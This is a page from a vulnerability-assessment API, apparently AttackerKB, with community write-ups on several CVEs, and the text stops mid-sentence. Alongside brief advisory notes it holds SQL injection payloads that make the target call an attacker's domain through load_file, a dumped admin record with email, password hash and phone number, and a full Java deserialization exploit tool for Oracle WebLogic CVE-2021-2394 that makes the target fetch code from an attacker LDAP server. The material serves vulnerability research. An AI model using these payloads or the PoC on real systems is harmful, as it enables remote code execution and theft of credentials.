{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=13&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=11&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=12&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "9101a539-4c6e-4638-a2ec-12080b7e3b50",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "d504b3a3-9855-4182-aef7-2899640d22b1",
      "created": "2021-11-03T21:13:55.51937Z",
      "revisionDate": "2021-11-10T04:35:06.917761Z",
      "document": "This assessment has moved to the [Rapid7 analysis](https://attackerkb.com/topics/ShpnUFlqDz/pre-auth-takeover-of-build-pipelines-in-gocd-cve-2021-43287/rapid7-analysis). Thank you.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "444ff08a-0c5d-424a-9bdc-699d0cbb74c8",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "dd04fb8d-5123-45e0-b23a-03238235a821",
      "created": "2021-11-04T17:02:55.701171Z",
      "revisionDate": "2023-05-17T08:22:26.355425Z",
      "document": "## [CVE-2021-26822](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26822)\r\n\r\n## [Vendor Software](https://phpgurukul.com/teachers-record-management-system-using-php-and-mysql/)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-26822/docs/Screenshot%202021-11-04%20182915.png)\r\n\r\n## Description\r\n\r\nThe searchteacher parameter appears to be vulnerable to SQL injection attacks. \r\nThe payload '+(select load_file('\\\\\\\\g1ivok7s826weh3qbkb5z839f0lt9k48vbj36tui.nu11secur1tyattack.net\\\\bqd'))+' was submitted in the searchteacher parameter. \r\nThis payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. \r\nThe application interacted with that domain, indicating that the injected SQL query was executed.\r\n\r\n\r\n## Paylod\r\n\r\n```mysql\r\n---\r\nParameter: searchteacher (POST)\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: searchteacher=470114'+(select load_file('\\\\\\\\g1ivok7s826weh3qbkb5z839f0lt9k48vbj36tui.nu11secur1tyattack.net\\\\bqd'))+'' AND (SELECT 5113 FROM (SELECT(SLEEP(5)))KIjD) AND 'VevZ'='VevZ&search=%C2%9E%C3%A9e\r\n\r\n    Type: UNION query\r\n    Title: Generic UNION query (NULL) - 4 columns\r\n    Payload: searchteacher=470114'+(select load_file('\\\\\\\\g1ivok7s826weh3qbkb5z839f0lt9k48vbj36tui.nu11secur1tyattack.net\\\\bqd'))+'' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170707171,0x464270665473516670554b446c745478524849484b654b554b52594859554643445044594f587455,0x7170626b71),NULL,NULL,NULL-- -&search=%C2%9E%C3%A9e\r\n---\r\n```\r\n\r\n## After the exploit\r\n\r\n```mysql\r\nDatabase: trms\r\nTable: tbladmin\r\n[1 entry]\r\n+----+---------------------+----------------------------------+----------+-----------+---------------------+--------------+\r\n| ID | Email               | Password                         | UserName | AdminName | AdminRegdate        | MobileNumber |\r\n+----+---------------------+----------------------------------+----------+-----------+---------------------+--------------+\r\n| 1  | adminuser@gmail.com | f925916e2754e5e03f75dd58a5733251 | admin    | Admin     | 2019-10-04 09:10:04 | 8979555556   |\r\n+----+---------------------+----------------------------------+----------+-----------+---------------------+--------------+\r\n```\r\n\r\n\r\n## Reproduce:\r\n\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-26822)\r\n\r\n## Proof\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-26822.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "98e7322a-9a5c-4694-8de3-36005eaca8fc",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "b9e45ef9-0147-466d-a882-85a4951dc8af",
      "created": "2021-11-04T18:58:44.56421Z",
      "revisionDate": "2021-11-04T18:58:44.564242Z",
      "document": "Here's a report from S1 https://www.sentinelone.com/labs/tipc-remote-linux-kernel-heap-overflow-allows-arbitrary-code-execution/",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "6cdf92ee-7bdb-457b-94d2-98449a86eded",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "deb21742-f92b-4f5a-931c-082502383c34",
      "created": "2021-11-08T15:18:13.998946Z",
      "revisionDate": "2021-11-08T15:18:13.996239Z",
      "document": "Rapid7's services teams are observing opportunistic exploitation of this vulnerability in the wild. Sounds like coin miners are the payload so far. ",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "b0f573aa-be6b-42ff-a1e4-1be65ef1e2e9",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "aa680cd3-76ec-4846-9c49-adbe618f13ba",
      "created": "2021-11-09T16:04:37.476255Z",
      "revisionDate": "2021-11-09T16:14:41.784074Z",
      "document": "CVE-2021-42237 is a .NET serialization vulnerability affecting Sitecore XP 7.5 - 8.2. Rapid7, and others, have observed this vulnerability being exploited in the wild by opportunistic attackers. Vulnerable internet facing Sitecore XP installations are at high risk of exploitation. See the Rapid7 analysis for full details.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4b5f17c8-d575-454e-95b8-fff168d222a0",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "146eabdc-17ba-44d0-bc27-d75db9e2c6ed",
      "created": "2021-11-09T19:54:19.742231Z",
      "revisionDate": "2021-11-09T19:54:19.742333Z",
      "document": "Remote Desktop Client Remote Code Execution Vulnerability\r\n\r\nSource: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-38666",
      "score": 1,
      "metadata": {
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "46271c33-663c-453b-99b3-bb39874b8468",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "e5ab35e3-eb0d-48a8-b0bc-5f63f94d23ab",
      "created": "2021-11-09T22:19:33.908274Z",
      "revisionDate": "2021-11-15T16:34:27.098784Z",
      "document": "This vulnerability is generally believed to be present in the Ubuntu Releases from 14.04 to 20.10 LTS.  There is some indication in the [Debian security tracker](https://security-tracker.debian.org/tracker/CVE-2021-3493) that Debian version 10 (AKA Buster) is also vulnerable, but I have not verified this independently.\r\n\r\nThe vulnerability is based in the implementation of overlayfs inside the Ubuntu Kernel.  Overlayfs sets the attributes of a process using a call to `vfs_setxattr`, but the data within that call should be verified by a prior call to `cap_convert_nscap`.  Ubuntu's implementation of overlayfs does not make that call for validation, and instead sends the request on to the file system without any check.  This means an attacker can set their own permission levels by using overlayfs to make the request.\r\nThis vulnerability was corrected by simply adding the verification call to  `cap_convert_nscap` into the `vfs_setxattr` function code, preventing the ability to call one without the other.\r\nUbuntu is ranked 6th on distrowatch right now, and is one of the more popular Linux-based operating systems.  It is very likely to find an Ubuntu system in enterprise settings, and worse yet, they tend to be ad-hoc systems with little maintenance or oversight, so unlikely to be patched.\r\nAs this is a local vulnerability in the kernel itself, patching is required for mitigation.  Use apt to upgrade your kernel to an unaffected version.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5edc4e9d-63cb-404c-8758-237601f7e6da",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "576f8783-ebfa-417b-9bc3-226b5b995b91",
      "created": "2021-11-13T18:00:11.445005Z",
      "revisionDate": "2023-05-17T08:21:30.606989Z",
      "document": "## [CVE-2021-43140](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43140)\r\n## [Vendor](https://www.sourcecodester.com/php/15013/simple-subscription-website-admin-panel-php-and-sqlite-source-code.html)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-43140/docs/Screenshot%202021-11-13%20194441.png)\r\n\r\n## Description:\r\nThe id parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the id parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.\r\n\r\n\r\n## MySQL Request:\r\n\r\n```sql\r\nGET /plan_application/?page=apply&id=4' HTTP/1.1\r\nHost: 192.168.1.2\r\nCookie: PHPSESSID=jtble9h28f0v3kh3op1ivmm9k4\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.2/plan_application/?page=view_plan&id=4\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n## MySQL Response:\r\n\r\n```sql\r\nHTTP/1.1 200 OK\r\nDate: Sat, 13 Nov 2021 15:03:36 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 3991\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<meta charset=\"UTF-8\">\r\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\r\n...[SNIP]...\r\n</b>: Uncaught Error: Call to a member function fetchArray() on bool in C:\\xampp\\htdocs\\plan_application\\apply.php:4\r\nStack trace:\r\n#0 C:\\xampp\\htdocs\\plan_application\\index.php(98): include()\r\n#1 {main}\r\nthrown in <b>\r\n...[SNIP]...\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-43140)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-43140.html)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "07a7ec14-3af3-4ac8-b1dc-179012f8e0a9",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "94c2cc34-918e-449f-8c61-f2b7bf16525c",
      "created": "2021-11-15T13:41:29.943942Z",
      "revisionDate": "2023-05-17T08:20:36.209349Z",
      "document": "## [CVE-2021-43130](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43130)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/14794/customer-relationship-management-crm-system-php-source-code.html)\r\n\r\n## Description:\r\nAn SQL Injection vulnerability exists in Sourcecodester Customer Relationship Management System (CRM) 1.0 via the username parameter in customer/login.php.\r\nThe parameter username is not sanitizing for malicious POST Requests, the malicious user can use a malicious payload to bypass admin login.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-43130)\r\n\r\n## Proof:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-43130/docs/CVE-2021-43130.gif)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9ec02377-c981-4ff5-a0f4-265056daf3e4",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "18b25255-9000-46c1-8a9f-1bcddcc11d73",
      "created": "2021-11-15T16:37:42.491914Z",
      "revisionDate": "2021-11-15T21:51:03.65307Z",
      "document": "# Description \r\n\r\nOn July 20, 2021 Oracle released their [quarterly security advisory](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=222178111629029&id=2773670.1&_afrWindowMode=0&_adf.ctrl-state=1t59all0x_4) which describes a remote execution vulnerability in multiple versions of WebLogic Server. The vulnerability is assigned **CVE-2021-2394** and NIST assigned it a critical CVSSv3 rating of [9.8](https://nvd.nist.gov/vuln/detail/CVE-2021-2394).  The vulnerability is accessible through IIOP, a protocol that WebLogic exposes to the internet by default, on port 7001.\r\n# Affected Products \r\nWebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0.\r\n\r\n# Vulnerability Analysis\r\nThe vulnerability is the result of old ideas combined with new techniques . The first half of this vulnerability is similar to the exploitation path taken by CVE-2020-14825 (which is quite similar to it's predecessor CVE-2020-14645). The second half of this vulnerability is similar to CVE-2020-14756. First, I'll briefly outline the details of CVE-2020-14825 as many of the principles are the same\r\n\r\nThe PoC for CVE-2020-14825:\r\n```\r\nimport com.sun.rowset.JdbcRowSetImpl;\r\nimport com.tangosol.util.comparator.ExtractorComparator;\r\nimport oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor;\t\r\nimport org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;\r\nimport ysoserial.payloads.util.Reflections;\r\n\r\nimport java.io.*;\r\nimport java.util.PriorityQueue;\r\n\r\npublic class CVE_2020_14825 {\r\n    public static void main(String[] args) throws Exception {\r\n        MethodAttributeAccessor accessor = new MethodAttributeAccessor();\r\n        accessor.setAttributeName(\"Timeline Sec\");\r\n        accessor.setIsWriteOnly(true);\r\n        accessor.setGetMethodName(\"getDatabaseMetaData\");\r\n//        accessor.setGetMethodName(\"connect\");\r\n\r\n        JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(com.sun.rowset.JdbcRowSetImpl.class);\r\n        jdbcRowSet.setDataSourceName(\"ldap://192.168.247.128:1389/#Poc\");\r\n\r\n        LockVersionExtractor extractor = new LockVersionExtractor(accessor,\"\");\r\n\r\n        PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(extractor));\r\n        Reflections.setFieldValue(queue,\"size\",2);\r\n\r\n        Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, \"queue\"));\r\n        queueArray[0] = jdbcRowSet;\r\n\r\n        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(new File(\"cve_2020_14825.ser\")));\r\n        out.writeObject(queue);\r\n        out.flush();\r\n        out.close();\r\n//        readObject();\r\n    }\r\n\r\n    public static void readObject() {\r\n        FileInputStream fis = null;\r\n        try {\r\n            fis = new FileInputStream(new File(\"\").getAbsolutePath() + \"/cve_2020_14825.ser\");\r\n            ObjectInputStream ois = new ObjectInputStream(fis);\r\n            ois.readObject();\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nCVE-2020-14825 was patched by adding `oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor` and `org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor` to  `DEFAULT_BLACKLIST_CLASSES` inside `WebLogicFilterConfig.class` which prevents these classes from being used to execute malicious code. (Quick note on CVE-2020-14645 mentioned above, it used `com.tangosol.util.extractor.UniversalExtractor` to execute code before that class was added to the blacklist in the same way `LockVersionExtractor` was blacklisted when patching CVE-2020-14825). \r\n\r\nPoC for CVE-2021-2394:\r\n```\r\nimport com.sun.rowset.JdbcRowSetImpl;\r\nimport com.tangosol.coherence.servlet.AttributeHolder;\r\nimport com.tangosol.util.SortedBag;\r\nimport com.tangosol.util.aggregator.TopNAggregator;\r\nimport oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor;\r\nimport org.eclipse.persistence.exceptions.DescriptorException;\r\nimport org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;\r\nimport org.eclipse.persistence.mappings.AttributeAccessor;\r\n\r\nimport javax.naming.Context;\r\nimport javax.naming.InitialContext;\r\nimport java.io.*;\r\nimport java.lang.reflect.*;\r\nimport java.util.Hashtable;\r\n\r\n\r\npublic class CVE_2021_2394 {\r\n    public static void main(String[] args) throws Exception {\r\n\r\n        String ldapurl = null;\r\n        String rhost = null;\r\n        try {\r\n            String ip = args[0];\r\n            String port = args[1];\r\n            ldapurl = args[2];\r\n            rhost = String.format(\"iiop://%s:%s\", ip, port);\r\n        } catch (Exception e) {\r\n            System.out.println(\"\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u683c\u5f0f\uff1a\");\r\n            System.out.println(\"java -jar CVE_2021_2394.jar rhost rport ldapurl\");\r\n            System.out.println(\"java -jar CVE_2021_2394.jar 192.168.137.1 7001 ldap://192.168.137.1:8087/Exploit\");\r\n            System.exit(0);\r\n        }\r\n\r\n        try {\r\n            System.out.println(\"[*] Attacking...\");\r\n            MethodAttributeAccessor accessor = new MethodAttributeAccessor();\r\n            accessor.setAttributeName(\"Timeline Sec\");\r\n            accessor.setGetMethodName(\"connect\");\r\n            accessor.setSetMethodName(\"setConnection\");\r\n\r\n            JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(JdbcRowSetImpl.class);\r\n            jdbcRowSet.setDataSourceName(ldapurl);\r\n\r\n            FilterExtractor extractor = new FilterExtractor(accessor);\r\n            FilterExtractor extractor1 = new FilterExtractor(new TLSAttributeAccessor());\r\n\r\n            SortedBag sortedBag = new TopNAggregator.PartialResult(extractor1, 2);\r\n            AttributeHolder attributeHolder = new AttributeHolder();\r\n            sortedBag.add(jdbcRowSet);\r\n\r\n            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField(\"m_comparator\");\r\n            m_comparator.setAccessible(true);\r\n            m_comparator.set(sortedBag, extractor);\r\n\r\n            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod(\"setInternalValue\", Object.class);\r\n            setInternalValue.setAccessible(true);\r\n            setInternalValue.invoke(attributeHolder, sortedBag);\r\n\r\n\r\n//            Test locally:\r\n//            FileOutputStream fileOutputStream = new FileOutputStream(new File(\"test.ser\"));\r\n//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\r\n//            objectOutputStream.writeObject(attributeHolder);\r\n//\r\n//            readObject();\r\n\r\n            Hashtable<String, String> env = new Hashtable<String, String>();\r\n            env.put(\"java.naming.factory.initial\", \"weblogic.jndi.WLInitialContextFactory\");\r\n            env.put(\"java.naming.provider.url\", rhost);\r\n            Context context = new InitialContext(env);\r\n\r\n            context.rebind(\"Timeline Sec\"+System.nanoTime(), attributeHolder);\r\n        } catch (Exception e) {\r\n            if (e.getMessage().equals(\"Unhandled exception in rebind()\")){\r\n                System.out.println(\"[*] \u53d1\u5305\u6210\u529f \u8bf7\u81ea\u884c\u68c0\u67e5\u662f\u5426\u5229\u7528\u6210\u529f\");\r\n            }else {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n\r\n\r\n    public static class TLSAttributeAccessor extends AttributeAccessor {\r\n\r\n        public Object getAttributeValueFromObject(Object o) throws DescriptorException {\r\n            return this.attributeName;\r\n        }\r\n\r\n        public void setAttributeValueInObject(Object o, Object o1) throws DescriptorException {\r\n            this.attributeName = \"Timeline Sec\";\r\n        }\r\n    }\r\n\r\n    public static void readObject() {\r\n        FileInputStream fis = null;\r\n        try {\r\n            fis = new FileInputStream(new File(\"\").getAbsolutePath() + \"/test.ser\");\r\n            ObjectInputStream ois = new ObjectInputStream(fis);\r\n            ois.readObject();\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nYou'll notice the two above PoCs are almost identical up until 14825 calls: ` LockVersionExtractor extractor = new LockVersionExtractor(accessor,\"\");` which was blacklisted. Researchers were forced to find other means to execute code (note the game of cat and mouse/ blacklist and find another vulnerable class, played by Oracle and security researchers). \r\n\r\nEnter `FilterExtractor` which resides in `oracle.eclipselink.coherence.integrated.internal.querying` and has the following method: `readExternal` \r\n![Screen Shot 2021-11-03 at 1 23 24 PM](https://user-images.githubusercontent.com/23320005/140150341-29827429-3701-4b06-b4c5-e7364496a876.png)\r\n\r\nIf we follow the `readAttributeAccessor` method we see that when the parameter `id = 1`, a `MethodAttributeAccessor` object is returned. You may be thinking - but `MethodAttributeAccessor` was just added to the blacklist in the October 2020 Critical Patch Update and couldn't be used to maliciously execute code. You're correct but when the `MethodAttributeAccessor` object is returned by `readAttributeAccessor`, it doesn't go through the deserialization process, avoids being caught by the blacklist and thus can still be used in exploitation. \r\n![Screen Shot 2021-11-03 at 1 37 13 PM](https://user-images.githubusercontent.com/23320005/140162666-a4b5f86d-fe18-445a-a3a7-2d5d5e782571.png)\r\n\r\nSo MethodAttributeAccessor can still be used and gets assigned to `this.attributeAccessor` once returned from `readAttributeAccessor`.  There's no way found to bypass the blacklisting of `LockVersionExtractor#Extract` in which the `initializeAttributes` and `getAttributeValueFromObject` methods of the accessor are called. However none was needed as `FilterExtractor#extract`, shown below, effectively provides the same functionality:\r\n![Screen Shot 2021-11-03 at 2 23 10 PM](https://user-images.githubusercontent.com/23320005/140172236-4f7fd38d-cfc8-4c92-a106-2a4d80a4e904.png)\r\n\r\nCalling `FilterExtractor#extract` will in turn invoke `MethodAttributeAccessor#getAttributeValueFromObject`. This method gets reflected by the implementation of  the `getMethod` that gets passed `anObject` and `parameters`.  Note `anObject` is attacker controlled while `parameters` will always be null which means only the no-argument method will be able to be called.\r\n![Screen Shot 2021-11-03 at 3 13 58 PM](https://user-images.githubusercontent.com/23320005/140178786-b8104b38-09ea-4190-8738-9f0a5ba50510.png)\r\n\r\nIf you're familiar with previous WebLogic serialization exploits you'll know `JdbcRowSetImpl` is a perfect candidate for an Object that will fit this use case while being able to be instantiated with a no-argument constructor. \r\n\r\nNow all that needs to be done is to find a place to call `FilterExtractor#readExternal` first and then `FilterExtractor#extract`.  This is where we can utilize ideas from CVE-2020-14756 in order to accomplish this. \r\n\r\nStart off by using: \u2028`com.tangosol.util.aggregator.TopNAggregator$PartialResult#readExternal`\r\nThe readExternal method does three things for us:\r\n1. It uses `ExternalizableHelper#readObject` to deserialize the comparator assignment to `m_comparator`. \r\n2. Then creates a map with m_comparator via `PartialResult#instantiateInternalMap`\r\n3. Then calls `PartialResult#add` to add the method to add the data to the map\u2028\u2028\r\n\r\n![readExternal](https://user-images.githubusercontent.com/23320005/140580020-6fda7f1b-2f0e-43c6-a4ec-be6f4924a471.png)\r\n\r\n\r\n\r\nIf we follow the `ExternalizableHelper#readObject`, knowing that `DataInput` is not an instance of `PInputStream`, we know `readObjectInternal` gets called.\r\n\r\n![two_read_object](https://user-images.githubusercontent.com/23320005/140560704-a8f7e50f-9d4b-475e-b0d6-ca78c47b9968.png)\r\n\r\n![readObjectInternal](https://user-images.githubusercontent.com/23320005/140563098-ac181ee2-af19-4b48-95a5-76613076b37b.png)\r\n\r\nIf the object implements the `ExternalizableLite` interface, the `readExternalizableLite` method will be called\r\n\r\n![readExternalizeableLite](https://user-images.githubusercontent.com/23320005/140563204-e3255be6-10b9-4996-8225-b631aff3bd05.png)\r\n\r\n\r\n\u2028Once called, it instantiates the object in the form of class loading and then calls the `readExternal` of the obtained object as seen above.\r\n\r\nIf we look at `PartialResult#instantiateInternalMap` we see users `m_comparator` to instantiate a `TreeMap`:\r\n\r\n![instantiateInternalMap](https://user-images.githubusercontent.com/23320005/140571474-2e590d88-e123-43c4-8701-a51c9f183b46.png)\r\n\r\nNow by following `PartialResult#add` we see `super.add` is called:\r\n\r\n![PartialResult_add](https://user-images.githubusercontent.com/23320005/140572440-703a1ba2-906c-45d7-bda8-6a677d0a1977.png)\r\n\r\nWhich in this context is `com.tangosol.util.SortedBag#add`. This method gets the `TreeMap` that has just been instantiated and calls the put method to insert the data into the map:\r\n![ SortedBag_add](https://user-images.githubusercontent.com/23320005/140572341-5ab58281-8d70-4f62-a2fc-e160d2e320bc.png)\r\n \r\n`TreeMap#put` gets called in the above which class `this.comparator#compare` and finally `AbstractExtractor#compare` which calls the `this.comparator#extract` method:\r\n![compare](https://user-images.githubusercontent.com/23320005/140574231-a90d6517-97b9-407b-ba6a-eadeae15eef1.png)\r\n\r\n\r\nAnd finally we see above that in the process of returning the SafeComparator, `this.comparator#extract` is called on the attacker-controlled object, and boom goes the dynamite. \r\n\r\n\r\n# Running the PoC\r\n\r\n\r\n## 1. Environment Setup\r\n\r\nAs noted by the PoC PR, you need to ensure you test with a JDK lower than: 6u211, 7u201, 8u191 or 11.0.1 as LDAP restrictions have been put in place in the aforementioned JDKs to prevent exploitation. I found this tool from the [QAX-A-TEAM]( https://github.com/QAX-A-Team/WeblogicEnvironment)\u2019s github repository helpful for building the test environment. The tool allows you to build a specific version of weblogic with a specific JDK in a single command.\r\n\r\n - With Oracle credentials, download [Oracle WebLogic Server 12.2.1.3 - Generic](https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html#license-lightbox)\r\n - Unzip the file downloaded and place `fmw_12.2.1.3.0_wls.jar` inside WeblogicEnvironment/weblogics\r\n - Again with Oracle credentials download [jdk-8u121-linux-x64.tar.gz](https://www.oracle.com/ca-en/java/technologies/javase/javase8-archive-downloads.html) \r\n - Place the zipped file downloaded in WeblogicEnvironments/jdks\r\n - Build the image:\r\n ```\r\ndocker build --no-cache --progress=plain --build-arg JDK_PKG=jdk-8u121-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.2.1.3.0_wls.jar -t weblogic_12 .\r\n```\r\n - Run the container: \r\n```\r\ndocker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic_12 weblogic_12\r\n```\r\n\r\n### 2. Enable local exploitation \r\n\r\nThe 